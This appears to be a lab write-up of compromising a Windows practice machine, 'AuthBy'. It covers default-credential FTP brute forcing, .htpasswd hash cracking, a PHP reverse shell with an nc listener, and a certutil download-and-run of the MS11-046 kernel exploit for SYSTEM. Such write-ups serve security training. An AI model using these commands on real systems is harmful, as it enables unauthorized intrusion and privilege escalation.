#Windows #FTP #BasicAuth #HashCracking #SeImpersonate #MS11-046 #KernelExploit #x86

## Overview

AuthBy is a Windows machine built around a layered credential chain: anonymous FTP exposes an admin interface, the admin FTP account reveals HTTP basic-auth credentials hidden in a `.htpasswd` file, and cracking that hash unlocks a PHP upload endpoint. The privilege escalation path drops Juicy Potato early because the box is 32-bit Windows Server 2008 R2, then pivots to a kernel exploit (MS11-046) targeting `afd.sys` for a direct SYSTEM shell.

## Recon

### Nmap

```sh
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        zFTPServer 6.0 build 2011-10-17
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
242/tcp  open  http       Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!
3145/tcp open  zftp-admin zFTPServer admin
3389/tcp open  ssl/ms-wbt-server
```

Three things stand out immediately: anonymous FTP is open, port 242 demands HTTP basic auth, and the RDP banner fingerprints the OS as Windows Server 2008 (Product_Version: 6.0.6001). That version matters a lot for the escalation later.

## Foothold

### Anonymous FTP

The anonymous account logs in fine but can't download any files from the root:

```sh
ftp 192.168.180.46
Name: anonymous
230 User logged in, proceed.
```

The root directory holds the zFTPServer application itself, settings files, and an `accounts/` folder, but read permissions are denied.

> **Why poke at default FTP credentials anyway:** anonymous access on FTP servers typically reveals the share layout, which tells you what services the application is running and what a privileged account might see differently. The `accounts/` directory listing here signals that account files are stored on disk, worth brute-forcing the login.

### Brute-Forcing FTP with Default Credentials

Hydra against SecLists' FTP default credential list finds working logins immediately:

```sh
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.180.46
[21][ftp] host: 192.168.180.46   login: admin   password: admin
```

Credentials:

```
admin : admin
```

### Looting the Admin FTP Session

With `admin:admin` the same root directory now exposes three extra files:

```sh
-r--r--r--   1 root     root           76 Nov 08  2011 index.php
-r--r--r--   1 root     root           45 Nov 08  2011 .htpasswd
-r--r--r--   1 root     root          161 Nov 08  2011 .htaccess
```

`.htpasswd` contains:

```
offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0
```

### Cracking the APR-MD5 Hash

`hash-identifier` confirms this is an APR-MD5 (`$apr1$`) hash, the variant Apache uses for `.htpasswd` files. John cracks it against rockyou in under a second:

```sh
john hash --wordlist=/usr/share/wordlists/rockyou.txt
elite            (?)
```

Credentials for the web interface:

```
offsec : ‹redacted›
```

> **APR-MD5 vs regular MD5:** the `$apr1$` prefix marks a salted, iterated variant of MD5 designed for password storage. It's much slower than a raw MD5 but still nowhere near bcrypt or sha512crypt, rockyou tears through it at ~253k p/s.

### PHP Shell via HTTP Upload

The basic-auth protected page at `http://192.168.180.46:242/` serves the same text as `index.php` downloaded over FTP. The `.htaccess` confirms `.php` files execute, and `index.php` reveals an upload path. I uploaded the Ivan Sincek PHP reverse shell and triggered it:

```
http://192.168.180.46:242/shell2.php
```

```sh
rlwrap nc -lvnp 53
connect to [...] from (UNKNOWN) [192.168.180.46] 49157
C:\wamp\bin\apache\Apache2.2.21> whoami
livda\apache
```

Local flag:

```powershell
C:\Users\apache\Desktop> type local.txt
‹redacted›
```

## Privilege Escalation

### SeImpersonate, Dead End on x86

`whoami /priv` shows SeImpersonatePrivilege enabled. The obvious choice is a Potato exploit, but:

```sh
systeminfo
System Type: X86-based PC
```

This is a 32-bit machine. Print Spoofer doesn't support x86, and several Juicy Potato CLSID attempts either fail to connect to the COM server or don't produce usable output. Even when the WUAUSERV CLSID (`{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}`) authenticates correctly, the extremely restricted environment on this box prevents the process creation step from working.

> **CLSID trial and error:** Juicy Potato needs a DCOM server running as SYSTEM that the exploit can coerce into creating a token. The right CLSID depends on the exact OS version and which services are running. The full list per OS is at `github.com/ohpe/juicy-potato/tree/master/CLSID`, worth bookmarking for every old Windows box you hit.

### MS11-046 Kernel Exploit (`afd.sys`)

Server 2008 R2 SP1 (build 6001) is vulnerable to MS11-046, a local privilege escalation in the Windows Ancillary Function Driver (`afd.sys`). Searchsploit has a pre-written C exploit:

```sh
searchsploit -m 40564
i686-w64-mingw32-gcc 40564.c -o pwn.exe -lws2_32
```

The cross-compiler flag `i686` produces a 32-bit PE, matching the target architecture. Transferring and running:

```powershell
certutil.exe -urlcache -f http://192.168.45.244/pwn.exe pwn.exe
.\pwn.exe
```

## Root / SYSTEM

```powershell
c:\Windows\System32> whoami
nt authority\system
```

```powershell
c:\Users\Administrator\Desktop> type proof.txt
‹redacted›
```

## Takeaways

- **Layered default credentials are a real attack chain.** FTP anonymous access led to admin FTP, which leaked HTTP credentials, which opened a PHP upload endpoint. Each step was a default or trivially weak secret.
- **Architecture determines your privesc toolkit.** SeImpersonate on an x86 box rules out most modern potato variants. Check `System Type` in `systeminfo` before reaching for GodPotato or PrintSpoofer.
- **Old kernels are free SYSTEM.** Server 2008 R2 with a public build number is a searchsploit query away from a kernel exploit. MS11-046 compiles cleanly with mingw and requires no interaction.
